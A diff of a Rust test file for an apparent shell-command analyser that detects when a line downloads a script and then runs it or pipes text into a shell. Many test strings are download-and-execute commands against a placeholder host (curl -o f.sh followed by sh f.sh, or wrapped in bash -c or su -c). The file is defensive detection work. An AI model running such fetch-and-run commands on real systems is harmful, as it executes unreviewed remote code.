@@ -1458,6 +1458,29 @@ fn a_command_in_a_substitution_is_read_without_what_closes_it() {
             fetched_files(line)
         );
     }
+    // What is piped into a shell inside one is run.
+    assert_eq!(run_targets("x=$(cat f | sh) ls"), ["f"]);
+    assert_eq!(run_targets("x=\"$(sh i.sh)\""), ["i.sh"]);
+    assert_eq!(run_targets("echo `sh i.sh`"), ["i.sh"]);
+    assert!(run_targets("x=$((1 + 2)) y=$(sha256sum f | cut -d ' ' -f 1)").is_empty());
+    assert!(run_targets(&"$(".repeat(100_000)).is_empty());
+    assert!(run_targets(&"$(a) ".repeat(100_000)).is_empty());
+    let fetched_then_run = "x=$(curl -fsSL https://x.example/a -o f.sh) sh f.sh";
+    assert!(
+        fetched_files(fetched_then_run)
+            .iter()
+            .any(|file| crate::rules::runs_file(fetched_then_run, file))
+    );
+    // What it prints is the variable's: a shell after the pipe does not
+    // read it.
+    assert!(run_targets("x=$(cat f) true | sh").is_empty());
+    assert_eq!(run_targets("x=$(cat f) cat g | sh"), ["g"]);
+    assert_eq!(run_targets("cat f | x=$(date) sh"), ["f"]);
+}
+
+#[test]
+fn a_substitution_in_a_quote_is_text_unless_a_shell_is_given_it() {
+    use crate::rules::{fetched_files, run_targets};
     // In single quotes or behind a backslash it is text, unless the line
     // hands text to a shell.
     for line in [
@@ -1484,6 +1507,9 @@ fn a_command_in_a_substitution_is_read_without_what_closes_it() {
         "echo 'x=$(curl -o f.sh https://x.example/f.sh)' | sh",
         "sudo -u u sh <<< 'x=$(curl -o f.sh https://x.example/f.sh)'",
         "trap 'x=$(curl -o f.sh https://x.example/f.sh)' EXIT",
+        "su -c 'x=$(curl -o f.sh https://x.example/f.sh)'",
+        "/bin/bash -c 'x=$(curl -o f.sh https://x.example/f.sh)'",
+        "find . -exec sh -c 'x=$(curl -o f.sh https://x.example/f.sh)' \\;",
         // A quote inside a substitution is that substitution's own.
         "x=\"$(echo \"it's\")\" y=\"$(curl -o f.sh https://x.example/f.sh)\"",
         "echo \"$(echo \"don't\")\" \"$(curl -o f.sh https://x.example/f.sh)\"",
@@ -1501,25 +1527,10 @@ fn a_command_in_a_substitution_is_read_without_what_closes_it() {
         "echo \"$(echo 'a $(curl -o f.sh https://x.example/f.sh)')\"",
         "msg 'a (b) $(curl -o f.sh https://x.example/f.sh)'",
         "echo 'trap `curl -o f.sh https://x.example/f.sh`'",
+        "tar -xc 'f$(curl -o f.sh https://x.example/f.sh)'",
+        "wc -c 'f$(curl -o f.sh https://x.example/f.sh)'",
+        "cat <<< 'see `curl -o f.sh https://x.example/f.sh`'",
     ] {
         assert!(fetched_files(line).is_empty(), "{line}");
     }
-    // What is piped into a shell inside one is run.
-    assert_eq!(run_targets("x=$(cat f | sh) ls"), ["f"]);
-    assert_eq!(run_targets("x=\"$(sh i.sh)\""), ["i.sh"]);
-    assert_eq!(run_targets("echo `sh i.sh`"), ["i.sh"]);
-    assert!(run_targets("x=$((1 + 2)) y=$(sha256sum f | cut -d ' ' -f 1)").is_empty());
-    assert!(run_targets(&"$(".repeat(100_000)).is_empty());
-    assert!(run_targets(&"$(a) ".repeat(100_000)).is_empty());
-    let fetched_then_run = "x=$(curl -fsSL https://x.example/a -o f.sh) sh f.sh";
-    assert!(
-        fetched_files(fetched_then_run)
-            .iter()
-            .any(|file| crate::rules::runs_file(fetched_then_run, file))
-    );
-    // What it prints is the variable's: a shell after the pipe does not
-    // read it.
-    assert!(run_targets("x=$(cat f) true | sh").is_empty());
-    assert_eq!(run_targets("x=$(cat f) cat g | sh"), ["g"]);
-    assert_eq!(run_targets("cat f | x=$(date) sh"), ["f"]);
 }
